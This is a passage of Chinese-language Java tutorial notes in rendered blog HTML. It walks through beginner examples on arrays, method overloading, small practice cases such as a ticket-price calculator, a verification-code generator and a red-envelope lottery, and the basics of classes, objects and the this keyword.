class="keyword">class</span> <span class="title class_">Demo3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arrs = &#123;<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>&#125;;</span><br><span class="line">        change(arrs);</span><br><span class="line">        System.out.println(<span class="string">&quot;main:&quot;</span> + arrs[<span class="number">1</span>]); <span class="comment">//222</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">change</span><span class="params">(<span class="type">int</span>[] arrs)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法内1:&quot;</span>+arrs[<span class="number">1</span>]); <span class="comment">//20</span></span><br><span class="line">        arrs[<span class="number">1</span>] = <span class="number">222</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法内2:&quot;</span>+arrs[<span class="number">1</span>]); <span class="comment">//222</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309191540348.png"></p><h2 id="判断两个数组是否相等"><a href="#判断两个数组是否相等" class="headerlink" title="判断两个数组是否相等"></a>判断两个数组是否相等</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr1 = &#123;&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = &#123;&#125;;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">res</span> <span class="operator">=</span> equals(arr1,arr2);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(<span class="type">int</span>[] arr1 ,<span class="type">int</span>[] arr2)</span>&#123;</span><br><span class="line">        <span class="comment">//1.判断两个数组是否为空</span></span><br><span class="line">        <span class="keyword">if</span> (arr1 == <span class="literal">null</span> &amp;&amp; arr2==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.其中一个是null</span></span><br><span class="line">        <span class="keyword">if</span> (arr1 == <span class="literal">null</span> || arr2==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3.判断长度是否一样</span></span><br><span class="line">        <span class="keyword">if</span> (arr1.length != arr2.length)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//4.判断每个元素是否相等</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr1[i] != arr2[i])&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//相等</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309191640870.png" alt="image-20230919164015800"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        test1(a); <span class="comment">//10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b )</span>&#123;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(<span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="案列"><a href="#案列" class="headerlink" title="案列"></a>案列</h1><h2 id="买飞机票"><a href="#买飞机票" class="headerlink" title="买飞机票"></a>买飞机票</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309251610751.png" alt="image-20230925161026312"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fly</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         <span class="type">double</span> <span class="variable">res</span> <span class="operator">=</span> calculate(<span class="number">1000</span>,<span class="number">8</span>,<span class="string">&quot;经济舱&quot;</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">calculate</span><span class="params">(<span class="type">double</span> price, <span class="type">int</span> month, String type)</span> &#123;</span><br><span class="line">        <span class="comment">// 判断当前月份是淡季还是旺季</span></span><br><span class="line">        <span class="keyword">if</span> (month &lt;= <span class="number">10</span> &amp;&amp; month &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="comment">// 旺季</span></span><br><span class="line">            <span class="comment">// 判断仓位类型</span></span><br><span class="line">            <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;头等舱&quot;</span>:</span><br><span class="line">                    price *= <span class="number">0.9</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;经济舱&quot;</span>:</span><br><span class="line">                    price *= <span class="number">0.85</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;头等舱&quot;</span>:</span><br><span class="line">                    price *= <span class="number">0.7</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;经济舱&quot;</span>:</span><br><span class="line">                    price *= <span class="number">0.65</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309261946568.png" alt="image-20230926194609057"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">code</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(createCode(<span class="number">4</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">createCode</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// 循环决定验证码个数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">type</span> <span class="operator">=</span> r.nextInt(<span class="number">3</span>);</span><br><span class="line">            <span class="comment">// 匹配验证码类型,0:数字,1:小写字母,2:大写字母</span></span><br><span class="line">            <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    code += r.nextInt(<span class="number">10</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    code += (<span class="type">char</span>) r.nextInt(<span class="number">97</span>, <span class="number">123</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    code += (<span class="type">char</span>) r.nextInt(<span class="number">65</span>, <span class="number">91</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="打分"><a href="#打分" class="headerlink" title="打分"></a>打分</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309261947611.png" alt="image-20230926194756546"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">dafen</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(getAverageScore(<span class="number">5</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">getAverageScore</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义一个数组用来接受分数,长度为n</span></span><br><span class="line">        <span class="type">int</span>[] scores = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;输入第&quot;</span> + (i + <span class="number">1</span>) + <span class="string">&quot;个评委的打分:&quot;</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">            scores[i] = score;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//总分</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> scores[<span class="number">0</span>];<span class="comment">//最大</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> scores[<span class="number">0</span>];<span class="comment">//最小</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 循环判断</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; scores.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span> scores[i];</span><br><span class="line">            sum += score;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (score &gt; max) &#123;</span><br><span class="line">                max = score;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (score &lt; min) &#123;</span><br><span class="line">                min = score;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1.0</span> * (sum - min - max) / (n - <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="copy数组"><a href="#copy数组" class="headerlink" title="copy数组"></a>copy数组</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309262141320.png" alt="image-20230926214113251"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">copyArray</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] res = copyArray(arr);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; res.length; i++) &#123;</span><br><span class="line">            System.out.println(res[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] copyArray(<span class="type">int</span>[] arr)&#123;</span><br><span class="line">        <span class="comment">//1.创建一个长度一样的数据</span></span><br><span class="line">        <span class="type">int</span>[] arr2 = <span class="keyword">new</span> <span class="title class_">int</span>[arr.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            arr2[i] = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="抢红包"><a href="#抢红包" class="headerlink" title="抢红包"></a>抢红包</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309262144733.png" alt="image-20230926214257331"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">redbao</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        start(a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(<span class="type">int</span>[] moneys)</span>&#123;</span><br><span class="line">        <span class="comment">// 定义输入和随机变量</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请您输入任意内容进行抽奖&quot;</span>);</span><br><span class="line">            sc.next();<span class="comment">//输入</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//随机抽取一个</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span>r.nextInt(moneys.length);</span><br><span class="line">                <span class="type">int</span> <span class="variable">money</span> <span class="operator">=</span> moneys[index];</span><br><span class="line">                <span class="comment">//判断是否为0</span></span><br><span class="line">                <span class="keyword">if</span> (money!=<span class="number">0</span>)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;恭喜您抽中红包:&quot;</span>+money);</span><br><span class="line">                    moneys[index] = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;活动结束&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="素数"><a href="#素数" class="headerlink" title="素数"></a>素数</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310092047027.png" alt="image-20231009204700428"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sushu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> getShu();</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getShu</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">101</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">2</span>; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i % j == <span class="number">0</span>) &#123;</span><br><span class="line">                    flag = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                sum +=<span class="number">1</span>;</span><br><span class="line">                System.out.println(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="99乘法表"><a href="#99乘法表" class="headerlink" title="99乘法表"></a>99乘法表</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;=i; j++) &#123;</span><br><span class="line">            System.out.print(j + <span class="string">&quot;x&quot;</span> + i + <span class="string">&quot;=&quot;</span> + (j*i )+ <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310101801672.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">double</span> chinese;</span><br><span class="line">    <span class="type">double</span> math;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printTotalScore</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;总成绩是&quot;</span> + (chinese + math));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printAverageScore</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;平均成绩是&quot;</span> + (chinese + math)/<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.创建对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        s1.name = <span class="string">&quot;小明&quot;</span>;</span><br><span class="line">        s1.math = <span class="number">100</span>;</span><br><span class="line">        s1.chinese = <span class="number">80</span>;</span><br><span class="line">        s1.printAverageScore();</span><br><span class="line">        s1.printTotalScore();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310111129159.png" alt="image-20231011112926803"></p><h2 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310111407336.png" alt="image-20231011140730262"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printThis</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        System.out.println(s1);</span><br><span class="line">        s1.printThis();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        System.out.println(s2);</span><br><span class="line">        